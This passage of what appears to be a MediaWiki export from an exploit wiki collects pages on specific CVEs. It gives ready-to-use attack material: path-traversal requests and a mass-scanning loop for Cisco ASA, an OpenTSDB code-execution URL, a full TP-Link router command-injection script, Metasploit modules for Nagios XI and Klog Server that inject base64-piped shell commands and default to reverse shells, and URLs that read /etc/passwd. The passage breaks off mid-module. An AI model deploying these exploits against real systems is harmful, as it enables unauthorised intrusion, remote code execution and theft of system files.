&lt;/pre&gt;

&lt;pre&gt;
GET /+CSCOT+/translation-table?type=mst&amp;textdomain=/%2bCSCOE%2b/portal_inc.lua&amp;default-language&amp;lang=../ HTTP/1.1
Host: 127.0.0.1
Connection: close
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3494.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.9
Cookie: webvpnlogin=1; webvpnLang=en
&lt;/pre&gt;

&lt;pre&gt;
GET /+CSCOT+/translation-table?type=mst&amp;textdomain=/%2bCSCOE%2b/portal_inc.lua&amp;default-language&amp;lang=../ HTTP/1.1
Host: 127.0.0.1
Content-Length: 2
&lt;/pre&gt;

從列表中單行檢查CVE-2020-3452

&lt;pre&gt;
while read DOM; do curl -s -k "https://$DOM/+CSCOT+/translation-table?type=mst&amp;textdomain=/%2bCSCOE%2b/portal_inc.lua&amp;default-language&amp;lang=../" | head | grep -q Cisco &amp;&amp; echo [VULNERABLE] $DOM || echo [NOT VULNERABLE] $DOM; done &lt; $1
&lt;/pre&gt;</text>
      <sha1>k76v4tzle5yyuu5mhl4n6n6miyace64</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2020-35476 OpenTSDB 2.4.0 遠程代碼執行漏洞</title>
    <ns>0</ns>
    <id>1522</id>
    <revision>
      <id>1904</id>
      <timestamp>2021-04-27T07:04:25Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==FOFA== &lt;pre&gt; title="Opentsdb" ||body="opentsdb_header.jpg" &lt;/pre&gt;  ==Bypass Payload== &lt;pre&gt; [33:system('touch/tmp/poc.txt')] &lt;/pre&gt;  ==POC== &lt;pre&gt; http://opentsdbhost.local/..."</comment>
      <origin>1904</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="368" sha1="n9yyt8moiab3v39122wmr03r5r5p3wh" xml:space="preserve">==FOFA==
&lt;pre&gt;
title="Opentsdb" ||body="opentsdb_header.jpg"
&lt;/pre&gt;

==Bypass Payload==
&lt;pre&gt;
[33:system('touch/tmp/poc.txt')]
&lt;/pre&gt;

==POC==
&lt;pre&gt;
http://opentsdbhost.local/q?start=2000/10/21-00:00:00&amp;end=2020/10/25-15:56:44&amp;m=sum:sys.cpu.nice&amp;o=&amp;ylabel=&amp;xrange=10:10&amp;yrange=[33:system('touch/tmp/poc.txt')]&amp;wxh=1516x644&amp;style=linespoint&amp;baba=lala&amp;grid=t&amp;json
&lt;/pre&gt;</text>
      <sha1>n9yyt8moiab3v39122wmr03r5r5p3wh</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2020-35575 TP-Link TL-WR841N 命令注入漏洞</title>
    <ns>0</ns>
    <id>5135</id>
    <revision>
      <id>5878</id>
      <timestamp>2021-06-24T09:40:34Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "&lt;languages /&gt; &lt;translate&gt; ==影響版本== &lt;/translate&gt; Version: TL-WR841N 0.9.1 4.0  ==EXP== &lt;pre&gt; # Exploit Title: TP-Link TL-WR841N - Command Injection # Date: 2020-12-13 #..."</comment>
      <origin>5878</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="2857" sha1="o76mg79gqmhnpz1aryyxbovo37kq88n" xml:space="preserve">&lt;languages /&gt;
&lt;translate&gt;
==影響版本==
&lt;/translate&gt;
Version: TL-WR841N 0.9.1 4.0

==EXP==
&lt;pre&gt;
# Exploit Title: TP-Link TL-WR841N - Command Injection
# Date: 2020-12-13
# Exploit Author: Koh You Liang
# Vendor Homepage: https://www.tp-link.com/
# Software Link: https://static.tp-link.com/TL-WR841N(JP)_V13_161028.zip
# Version: TL-WR841N 0.9.1 4.0
# Tested on: Windows 10
# CVE : CVE-2020-35575

import requests
import sys
import time

try:
    _ = sys.argv[2]
    payload = ' '.join(sys.argv[1:])
except IndexError:
    try:
        payload = sys.argv[1]
    except IndexError:
        print("[*] Command not specified, using the default `cat etc/passwd=`")
        payload = 'cat etc/passwd'

# Default credentials is admin:admin - replace with your own
cookies = {
    'Authorization': 'Basic YWRtaW46YWRtaW4='
}

headers = {
    'Host': '192.168.0.1',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:84.0) Gecko=/20100101 Firefox/84.0',
    'Accept': '*/*',
    'Accept-Language': 'en-US,en;q=0.5',
    'Accept-Encoding': 'gzip, deflate',
    'Content-Type': 'text/plain',
    'Content-Length': '197',
    'Origin': 'http://192.168.0.1',
    'Connection': 'close',
    'Referer': 'http://192.168.0.1/mainFrame.htm',
}

data1 = \
'''[TRACEROUTE_DIAG#0,0,0,0,0,0#0,0,0,0,0,0]0,8\r\nmaxHopCount=20\r\ntimeout=50\r\nnumberOfTries=1\r\nhost="`{}`"\r\ndataBlockSize=64\r\nX_TP_ConnName=ewan_ipoe_d\r\ndiagnosticsState=Requested\r\nX_TP_HopSeq=0\r\n'''.format(payload)
response1 = requests.post('http://192.168.0.1/cgi?2', headers=headers, cookies=cookies, data=data1, verify=False)
print('[+] Sending payload...')

try:
    response1.text.splitlines()[0]
except IndexError:
    sys.exit('[-] Cannot get response. Please check your cookie.')
if response1.text.splitlines()[0] != '[error]0':
    sys.exit('[*] Router/Firmware is not vulnerable.')

data2 = '[ACT_OP_TRACERT#0,0,0,0,0,0#0,0,0,0,0,0]0,0\r\n'
response2 = requests.post('http://192.168.0.1/cgi?7', headers=headers, cookies=cookies, data=data2, verify=False)
print('[+] Receiving response from router...')
time.sleep(0.8) # Buffer time for traceroute to succeed

data3 = '''[TRACEROUTE_DIAG#0,0,0,0,0,0#0,0,0,0,0,0]0,3\r\ndiagnosticsState\r\nX_TP_HopSeq\r\nX_TP_Result\r\n'''
response3 = requests.post('http://192.168.0.1/cgi?1', headers=headers, cookies=cookies, data=data3, verify=False)

if '=:' in response3.text.splitlines()[3]:
    print('[-] Command not supported.')
else:
    print('[+] Exploit successful!')
    for line_number, line in enumerate(response3.text.splitlines()):
        try:
            if line_number == 3:
                print(line[12:])
            if line_number &gt; 3 and line != '[error]0':
                print(line)
                if 'not known' in line:
                    break
        except IndexError:
            break
            
&lt;/pre&gt;</text>
      <sha1>o76mg79gqmhnpz1aryyxbovo37kq88n</sha1>
    </revision>
    <revision>
      <id>5880</id>
      <parentid>5878</parentid>
      <timestamp>2021-06-24T09:41:55Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Marked this version for translation</comment>
      <origin>5880</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="2868" sha1="faqgsg1tll1qybyk47bkpssua4hj4a7" xml:space="preserve">&lt;languages /&gt;
&lt;translate&gt;
==影響版本== &lt;!--T:1--&gt;
&lt;/translate&gt;
Version: TL-WR841N 0.9.1 4.0

==EXP==
&lt;pre&gt;
# Exploit Title: TP-Link TL-WR841N - Command Injection
# Date: 2020-12-13
# Exploit Author: Koh You Liang
# Vendor Homepage: https://www.tp-link.com/
# Software Link: https://static.tp-link.com/TL-WR841N(JP)_V13_161028.zip
# Version: TL-WR841N 0.9.1 4.0
# Tested on: Windows 10
# CVE : CVE-2020-35575

import requests
import sys
import time

try:
    _ = sys.argv[2]
    payload = ' '.join(sys.argv[1:])
except IndexError:
    try:
        payload = sys.argv[1]
    except IndexError:
        print("[*] Command not specified, using the default `cat etc/passwd=`")
        payload = 'cat etc/passwd'

# Default credentials is admin:admin - replace with your own
cookies = {
    'Authorization': 'Basic YWRtaW46YWRtaW4='
}

headers = {
    'Host': '192.168.0.1',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:84.0) Gecko=/20100101 Firefox/84.0',
    'Accept': '*/*',
    'Accept-Language': 'en-US,en;q=0.5',
    'Accept-Encoding': 'gzip, deflate',
    'Content-Type': 'text/plain',
    'Content-Length': '197',
    'Origin': 'http://192.168.0.1',
    'Connection': 'close',
    'Referer': 'http://192.168.0.1/mainFrame.htm',
}

data1 = \
'''[TRACEROUTE_DIAG#0,0,0,0,0,0#0,0,0,0,0,0]0,8\r\nmaxHopCount=20\r\ntimeout=50\r\nnumberOfTries=1\r\nhost="`{}`"\r\ndataBlockSize=64\r\nX_TP_ConnName=ewan_ipoe_d\r\ndiagnosticsState=Requested\r\nX_TP_HopSeq=0\r\n'''.format(payload)
response1 = requests.post('http://192.168.0.1/cgi?2', headers=headers, cookies=cookies, data=data1, verify=False)
print('[+] Sending payload...')

try:
    response1.text.splitlines()[0]
except IndexError:
    sys.exit('[-] Cannot get response. Please check your cookie.')
if response1.text.splitlines()[0] != '[error]0':
    sys.exit('[*] Router/Firmware is not vulnerable.')

data2 = '[ACT_OP_TRACERT#0,0,0,0,0,0#0,0,0,0,0,0]0,0\r\n'
response2 = requests.post('http://192.168.0.1/cgi?7', headers=headers, cookies=cookies, data=data2, verify=False)
print('[+] Receiving response from router...')
time.sleep(0.8) # Buffer time for traceroute to succeed

data3 = '''[TRACEROUTE_DIAG#0,0,0,0,0,0#0,0,0,0,0,0]0,3\r\ndiagnosticsState\r\nX_TP_HopSeq\r\nX_TP_Result\r\n'''
response3 = requests.post('http://192.168.0.1/cgi?1', headers=headers, cookies=cookies, data=data3, verify=False)

if '=:' in response3.text.splitlines()[3]:
    print('[-] Command not supported.')
else:
    print('[+] Exploit successful!')
    for line_number, line in enumerate(response3.text.splitlines()):
        try:
            if line_number == 3:
                print(line[12:])
            if line_number &gt; 3 and line != '[error]0':
                print(line)
                if 'not known' in line:
                    break
        except IndexError:
            break
            
&lt;/pre&gt;</text>
      <sha1>faqgsg1tll1qybyk47bkpssua4hj4a7</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2020-35578 Nagios XI 遠程命令執行漏洞</title>
    <ns>0</ns>
    <id>3112</id>
    <revision>
      <id>3615</id>
      <timestamp>2021-05-30T02:20:37Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==INFO== This Metasploit module exploits a command injection vulnerability in the /admin/monitoringplugins.php page of Nagios XI versions prior to 5.8.0 when uploading plugins..."</comment>
      <origin>3615</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="9025" sha1="krgqe56yw56c7wp3r7i80cpkroms69i" xml:space="preserve">==INFO==
This Metasploit module exploits a command injection vulnerability in the /admin/monitoringplugins.php page of Nagios XI versions prior to 5.8.0 when uploading plugins. Successful exploitation allows an authenticated admin user to achieve remote code execution as the apache user by uploading a malicious plugin. Valid credentials for a Nagios XI admin user are required. This module has been successfully tested against Nagios versions XI 5.3.0 and 5.7.5, both running on CentOS 7.

==EXP==
&lt;pre&gt;
##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule &lt; Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::Remote::HTTP::NagiosXi
  include Msf::Exploit::CmdStager
  include Msf::Exploit::FileDropper
  prepend Msf::Exploit::Remote::AutoCheck

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' =&gt; 'Nagios XI Prior to 5.8.0 - Plugins Filename Authenticated Remote Code Exection',
        'Description' =&gt; %q{
          This module exploits a command injection vulnerability (CVE-2020-35578) in the `/admin/monitoringplugins.php`
          page of Nagios XI versions prior to 5.8.0 when uploading plugins. Successful exploitation allows
          an authenticated admin user to achieve remote code execution as the `apache` user by uploading
          a malicious plugin.

          Valid credentials for a Nagios XI admin user are required. This module has
          been successfully tested against Nagios versions XI 5.3.0 and 5.7.5, both
          running on CentOS 7.
        },
        'License' =&gt; MSF_LICENSE,
        'Author' =&gt;
          [
            'Haboob Team', # https://haboob.sa - PoC
            'Erik Wynter' # @wyntererik - Metasploit'
          ],
        'References' =&gt;
          [
            ['CVE', '2020-35578'],
            ['EDB', '49422']
          ],
        'Platform' =&gt; %w[linux unix],
        'Arch' =&gt; [ ARCH_X86, ARCH_X64, ARCH_CMD],
        'Targets' =&gt;
          [
            [
              'Linux (x86/x64)', {
                'Arch' =&gt; [ARCH_X86, ARCH_X64],
                'Platform' =&gt; 'linux',
                # only the wget and perhaps the curl CmdStagers work against a typical Nagios XI host (CentOS 7 minimal) if Nagios XI was installed according to the documentation
                'CmdStagerFlavor' =&gt; :wget,
                'DefaultOptions' =&gt; { 'PAYLOAD' =&gt; 'linux/x86/meterpreter/reverse_tcp' }
              }
            ],
            [
              'CMD', {
                'Arch' =&gt; [ARCH_CMD],
                'Platform' =&gt; 'unix',
                'DefaultOptions' =&gt; { 'PAYLOAD' =&gt; 'cmd/unix/reverse_bash' }
              }
            ]
          ],
        'Privileged' =&gt; false,
        'DisclosureDate' =&gt; '2020-12-19',
        'DefaultTarget' =&gt; 0,
        'Notes' =&gt;
          {
            'Stability' =&gt; [ CRASH_SAFE ],
            'SideEffects' =&gt; [ ARTIFACTS_ON_DISK, IOC_IN_LOGS, CONFIG_CHANGES ],
            'Reliability' =&gt; [FIRST_ATTEMPT_FAIL] # payload may not connect back the first time
          }
      )
    )

    register_options [
      OptString.new('USERNAME', [true, 'Username to authenticate with', 'nagiosadmin']),
      OptString.new('PASSWORD', [true, 'Password to authenticate with', nil])
    ]
  end

  def username
    datastore['USERNAME']
  end

  def password
    datastore['PASSWORD']
  end

  def finish_install
    datastore['FINISH_INSTALL']
  end

  def check
    # Use nagios_xi_login to try and authenticate. If authentication succeeds, nagios_xi_login returns
    # an array containing the http response body of a get request to index.php and the session cookies
    login_result, res_array = nagios_xi_login(username, password, finish_install)
    case login_result
    when 1..3 # An error occurred
      return CheckCode::Unknown(res_array[0])
    when 4 # Nagios XI is not fully installed
      install_result = install_nagios_xi(password)
      if install_result
        return CheckCode::Unknown(install_result[1])
      end

      login_result, res_array = login_after_install_or_license(username, password, finish_install)
      case login_result
      when 1..3 # An error occurred
        return CheckCode::Unknown(res_array[0])
      when 4 # Nagios XI is still not fully installed
        return CheckCode::Detected('Failed to install Nagios XI on the target.')
      end
    end

    # when 5 is excluded from the case statement above to prevent having to use this code block twice.
    # Including when 5 would require using this code block once at the end of the `when 4` code block above, and once here.
    if login_result == 5 # the Nagios XI license agreement has not been signed
      auth_cookies, nsp = res_array
      sign_license_result = sign_license_agreement(auth_cookies, nsp)
      if sign_license_result
        return CheckCode::Unknown(sign_license_result[1])
      end

      login_result, res_array = login_after_install_or_license(username, password, finish_install)
      case login_result
      when 1..3
        return CheckCode::Unknown(res_array[0])
      when 5 # the Nagios XI license agreement still has not been signed
        return CheckCode::Detected('Failed to sign the license agreement.')
      end
    end

    print_good('Successfully authenticated to Nagios XI')

    # Obtain the Nagios XI version
    @auth_cookies = res_array[1] # if we are here, this cannot be nil since the mixin checks for that already

    nagios_version = nagios_xi_version(res_array[0])
    if nagios_version.nil?
      return CheckCode::Detected('Unable to obtain the Nagios XI version from the dashboard')
    end

    print_status("Target is Nagios XI with version #{nagios_version}")
    # check if the target is actually vulnerable
    if /^\d{4}R\d\.\d/.match(nagios_version) || /^\d{4}RC\d/.match(nagios_version) || /^\d{4}R\d.\d[A-Ha-h]/.match(nagios_version) || nagios_version == '5R1.0'
      nagios_version = '1.0.0' # Set to really old version as a placeholder. Basically we don't want to exploit these versions.
    end
    @version = Rex::Version.new(nagios_version)
    if @version &lt; Rex::Version.new('5.8.0')
      return CheckCode::Appears
    end

    return CheckCode::Safe
  end

  def execute_command(cmd, _opts = {})
    # Convert the payload to hex ASCII and then Base64 encode the payload.
    # This is necessary for the exploit to work.
    payload_ascii = Rex::Text.to_hex_ascii(cmd)
    payload_base64 = Rex::Text.encode_base64(payload_ascii)
    payload = ";echo #{payload_base64} | base64 -d | bash;#"
    register_file_for_cleanup("/usr/local/nagios/libexec/#{payload}") # deleting the payload via the web interface doesn't seem possible

    # generate post data
    post_data = Rex::MIME::Message.new
    random_post_content = rand_text_alphanumeric(8..12)
    post_data.add_part('', nil, nil, 'form-data; name="upload"')
    post_data.add_part(@nsp, nil, nil, 'form-data; name="nsp"')
    post_data.add_part(random_post_content, 'text/plain', nil, "form-data; name=\"uploadedfile\"; filename=\"#{payload}\"")
    post_data.add_part('1', nil, nil, 'form-data; name="convert_to_unix"')

    # upload payload
    send_request_cgi({
      'method' =&gt; 'POST',
      'uri' =&gt; normalize_uri(target_uri.path, 'admin', 'monitoringplugins.php'),
      'ctype' =&gt; "multipart/form-data; boundary=#{post_data.bound}",
      'cookie' =&gt; @auth_cookies,
      'data' =&gt; post_data.to_s
    }, 0) # don't wait for a response from the target, otherwise the module will hang for a few seconds after executing the payload
  end

  def exploit
    if @version &lt; Rex::Version.new('5.3.0')
      fail_with(Failure::NoTarget, 'Target is vulnerable but this module currently does not support exploiting target prior to 5.3.0!')
    end

    # visit /admin/monitoringplugins.php in order to get the nsp token required to upload the payload
    res = send_request_cgi({
      'method' =&gt; 'GET',
      'uri' =&gt; normalize_uri(target_uri.path, 'admin', 'monitoringplugins.php'),
      'cookie' =&gt; @auth_cookies
    })

    unless res
      fail_with(Failure::Disconnected, "Connection failed while trying to visit `#{normalize_uri(target_uri.path, 'admin', 'monitoringplugins.php')}`")
    end

    unless res.code == 200 &amp;&amp; res.body.include?('&lt;title&gt;Manage Plugins &amp;middot; Nagios XI&lt;/title&gt;')
      fail_with(Failure::UnexpectedReply, "Unexpected response received while trying to visit `#{normalize_uri(target_uri.path, 'admin', 'monitoringplugins.php')}`")
    end

    # grab the nsp token, using the Nagios XI mixin
    @nsp = get_nsp(res)

    if @nsp.blank?
      fail_with(Failure::Unknown, 'Failed to obtain the nsp token required to upload the payload')
    end

    if target.arch.first == ARCH_CMD
      print_status('Executing the payload')
      execute_command(payload.encoded)
    else
      execute_cmdstager(background: true)
    end
  end
end
&lt;/pre&gt;</text>
      <sha1>krgqe56yw56c7wp3r7i80cpkroms69i</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2020-35598 Advanced Comment System 1.0 目錄遍歷漏洞</title>
    <ns>0</ns>
    <id>3589</id>
    <revision>
      <id>4171</id>
      <timestamp>2021-06-06T14:09:57Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "&lt;languages /&gt; &lt;translate&gt; ==影響版本== &lt;/translate&gt; v1.0  ==EXP== &lt;pre&gt; http://localhost/advanced_component_system/index.php?ACS_path=..%2f..%2f..%2f..%2f..%2f..%2f..%2f....."</comment>
      <origin>4171</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="248" sha1="r2doigs3h3io9jsc2jmcpzqu1cb4t1r" xml:space="preserve">&lt;languages /&gt;
&lt;translate&gt;
==影響版本==
&lt;/translate&gt;
v1.0

==EXP==
&lt;pre&gt;
http://localhost/advanced_component_system/index.php?ACS_path=..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd%00        
&lt;/pre&gt;</text>
      <sha1>r2doigs3h3io9jsc2jmcpzqu1cb4t1r</sha1>
    </revision>
    <revision>
      <id>4172</id>
      <parentid>4171</parentid>
      <timestamp>2021-06-06T14:10:22Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Marked this version for translation</comment>
      <origin>4172</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="259" sha1="gi6ce2lyh7ext7zxv3zgw0hnto2roco" xml:space="preserve">&lt;languages /&gt;
&lt;translate&gt;
==影響版本== &lt;!--T:1--&gt;
&lt;/translate&gt;
v1.0

==EXP==
&lt;pre&gt;
http://localhost/advanced_component_system/index.php?ACS_path=..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd%00        
&lt;/pre&gt;</text>
      <sha1>gi6ce2lyh7ext7zxv3zgw0hnto2roco</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2020-35598 Advanced Comment System 1.0 目錄遍歷漏洞/zh-cn</title>
    <ns>0</ns>
    <id>3594</id>
    <revision>
      <id>4177</id>
      <timestamp>2021-06-06T14:11:54Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==影响版本=="</comment>
      <origin>4177</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="223" sha1="apldn6dnidb6hshdrrzkbvjqmvx5dgm" xml:space="preserve">&lt;languages /&gt;
==影响版本==
v1.0

==EXP==
&lt;pre&gt;
http://localhost/advanced_component_system/index.php?ACS_path=..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd%00        
&lt;/pre&gt;</text>
      <sha1>apldn6dnidb6hshdrrzkbvjqmvx5dgm</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2020-35616 Joomla ACL Privilege Escalation漏洞</title>
    <ns>0</ns>
    <id>267</id>
    <revision>
      <id>415</id>
      <timestamp>2021-03-18T09:51:14Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==POC== &lt;pre&gt; POST administrator/index.php?option={Target Category} ... ... ... &amp;jform[rules][core.{create|delete|edit}][AttackerID]=1  &lt;/pre&gt;"</comment>
      <origin>415</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="142" sha1="fct27clhbwzgpaxniwbm4tntexvpxn4" xml:space="preserve">==POC==
&lt;pre&gt;
POST administrator/index.php?option={Target Category}
...
...
...
&amp;jform[rules][core.{create|delete|edit}][AttackerID]=1

&lt;/pre&gt;</text>
      <sha1>fct27clhbwzgpaxniwbm4tntexvpxn4</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2020-35729 Klog Server 2.4.1 命令注入漏洞</title>
    <ns>0</ns>
    <id>3129</id>
    <revision>
      <id>3632</id>
      <timestamp>2021-05-30T02:56:06Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "&lt;pre&gt; ## # This module requires Metasploit: https://metasploit.com/download # Current source: https://github.com/rapid7/metasploit-framework ##  class MetasploitModule &lt; Msf::..."</comment>
      <origin>3632</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="4684" sha1="mmbw02rv8050p2azjsdpiindz76yptl" xml:space="preserve">&lt;pre&gt;
##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule &lt; Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::CmdStager
  prepend Msf::Exploit::Remote::AutoCheck

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' =&gt; 'Klog Server authenticate.php user Unauthenticated Command Injection',
        'Description' =&gt; %q{
          This module exploits an unauthenticated command injection vulnerability
          in Klog Server versions 2.4.1 and prior.

          The `authenticate.php` file uses the `user` HTTP POST parameter in a call
          to the `shell_exec()` PHP function without appropriate input validation,
          allowing arbitrary command execution as the apache user.

          The sudo configuration permits the apache user to execute any command
          as root without providing a password, resulting in privileged command
          execution as root.

          This module has been successfully tested on Klog Server version 2.4.1
          virtual appliance.
        },
        'License' =&gt; MSF_LICENSE,
        'Author' =&gt;
        [
          'b3kc4t', # Vulnerability discovery and exploit
          'Metin Yunus Kandemir', # Metasploit module
          'bcoles', # Metasploit module
        ],
        'References' =&gt;
        [
          ['CVE', '2020-35729'],
          ['CWE', '78'],
          ['EDB', '49366'],
          ['EDB', '49474'],
          ['PACKETSTORM', '160798'],
          ['PACKETSTORM', '161123'],
          ['URL', 'https://github.com/mustgundogdu/Research/tree/main/KLOG_SERVER'],
          ['URL', 'https://docs.unsafe-inline.com/0day/klog-server-unauthentication-command-injection']
        ],
        'DefaultOptions' =&gt;
          {
            'SSL' =&gt; true,
            'RPORT' =&gt; 443
          },
        'Platform' =&gt; %w[unix linux],
        'Targets' =&gt; [
          [
            'Linux (x86)', {
              'Arch' =&gt; ARCH_X86,
              'Platform' =&gt; 'linux',
              'DefaultOptions' =&gt; {
                'PAYLOAD' =&gt; 'linux/x86/meterpreter/reverse_tcp'
              }
            }
          ],
          [
            'Linux (x64)', {
              'Arch' =&gt; ARCH_X64,
              'Platform' =&gt; 'linux',
              'DefaultOptions' =&gt; {
                'PAYLOAD' =&gt; 'linux/x64/meterpreter/reverse_tcp'
              }
            }
          ],
          [
            'Linux (cmd)', {
              'Arch' =&gt; ARCH_CMD,
              'Platform' =&gt; 'unix',
              'DefaultOptions' =&gt; {
                'PAYLOAD' =&gt; 'cmd/unix/reverse_bash'
              }
            }
          ],
        ],
        'Privileged' =&gt; true,
        'DisclosureDate' =&gt; '2020-12-27',
        'DefaultTarget' =&gt; 0,
        'Notes' =&gt;
          {
            'Stability' =&gt; [ CRASH_SAFE ],
            'SideEffects' =&gt; [ ARTIFACTS_ON_DISK, IOC_IN_LOGS ],
            'Reliability' =&gt; [ REPEATABLE_SESSION ]
          }
      )
    )
    register_options(
      [
        OptString.new('TARGETURI', [true, 'The base path of the Klog Server', '/']),
        OptBool.new('USE_SUDO', [true, 'Execute payload as root using sudo', true])
      ]
    )
  end

  def login(user, pass)
    send_request_cgi({
      'method' =&gt; 'POST',
      'uri' =&gt; normalize_uri(target_uri.path, 'actions', 'authenticate.php'),
      'vars_post' =&gt; {
        'user' =&gt; user,
        'pswd' =&gt; pass
      }
    })
  end

  def execute_command(cmd, _opts = {})
    user = "#{rand_text_alpha(8..12)}\" &amp; "
    if datastore['USE_SUDO']
      user &lt;&lt; "echo #{Rex::Text.encode_base64(cmd)}|base64 -d|sudo sh"
    else
      user &lt;&lt; cmd
    end
    user &lt;&lt; ' &amp; echo "'

    pass = rand_text_alpha(8..12)
    login(user, pass)
  end

  def check
    sleep = rand(9..11)
    t1 = Time.now.to_i
    res = execute_command("sleep #{sleep}")
    t2 = Time.now.to_i

    unless res
      return CheckCode::Safe('Connection failed')
    end

    unless res.code == 302 &amp;&amp; res.headers['location'].to_s.include?('login.php?error')
      return CheckCode::Safe("Unexpected reply (HTTP #{res.code}). Expected redirect (HTTP 302) to login error page.")
    end

    diff = t2 - t1

    if diff &lt; sleep
      return CheckCode::Safe("No response within the expected period of time (#{sleep} seconds).")
    end

    CheckCode::Vulnerable("Response received after #{diff} seconds.")
  end

  def exploit
    if target.arch.first == ARCH_CMD
      execute_command(payload.encoded)
    else
      execute_cmdstager(background: true)
    end
  end
end
&lt;/pre&gt;</text>
      <sha1>mmbw02rv8050p2azjsdpiindz76yptl</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2020-35736 GateOne 任意文件讀取漏洞</title>
    <ns>0</ns>
    <id>3097</id>
    <revision>
      <id>3597</id>
      <timestamp>2021-05-28T01:25:40Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==Payload== &lt;pre&gt; https://192.168.150.128:48620/downloads/../../../../etc/passwd  &lt;/pre&gt;"</comment>
      <origin>3597</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="88" sha1="b4ucmv7y8ex8ejq9l5hz1mbt9u2f7h2" xml:space="preserve">==Payload==
&lt;pre&gt;
https://192.168.150.128:48620/downloads/../../../../etc/passwd 
&lt;/pre&gt;</text>
      <sha1>b4ucmv7y8ex8ejq9l5hz1mbt9u2f7h2</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2020-35749 Simple JobBoard 認證文件讀取漏洞</title>
    <ns>0</ns>
    <id>3229</id>
    <revision>
      <id>3767</id>
      <timestamp>2021-05-31T04:04:42Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==INFO== This Metasploit module exploits an authenticated directory traversal vulnerability in WordPress plugin Simple JobBoard versions prior to 2.9.3 to perform an arbitrary..."</comment>
      <origin>3767</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="3967" sha1="gdy6dznpcv1i1gtk9h0d8d8hgiuqmsi" xml:space="preserve">==INFO==
This Metasploit module exploits an authenticated directory traversal vulnerability in WordPress plugin Simple JobBoard versions prior to 2.9.3 to perform an arbitrary file read with the web server privileges.

==EXP==
&lt;pre&gt;
##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule &lt; Msf::Auxiliary
    include Msf::Auxiliary::Report
    include Msf::Exploit::Remote::HTTP::Wordpress
    include Msf::Auxiliary::Scanner

      def initialize(info = {})
          super(update_info(info,
            'Name'           =&gt; 'Simple JobBoard Authenticated File Read Vulnerability',
            'Description'    =&gt; %q{
                This module exploits an authenticated directory traversal vulnerability in WordPress plugin 'Simple JobBoard ' &lt; 2.9.3,
                allowing arbitrary file read with the web server privileges.
            },
            'Author'         =&gt;
              [
                'Arcangelo Saracino', # Vulnerability discovery
                'Hoa Nguyen - Suncsr Team',    # Metasploit module
              ],
            'License'        =&gt; MSF_LICENSE,
            'References'     =&gt;
              [
                ['CVE', '2020-35749'],
                ['WPVDB', 'eed3bd69-2faf-4bc9-915c-c36211ef9e2d'],
                ['URL','https://arkango.github.io/CVE-2020/CVE-2020-35749%20DIr.%20Traversal%20Simple%20Board%20Job%20Wordpress%20plugin.html']
              ],
            'DisclosureDate' =&gt; 'Jan 15 2021'))

            register_options([
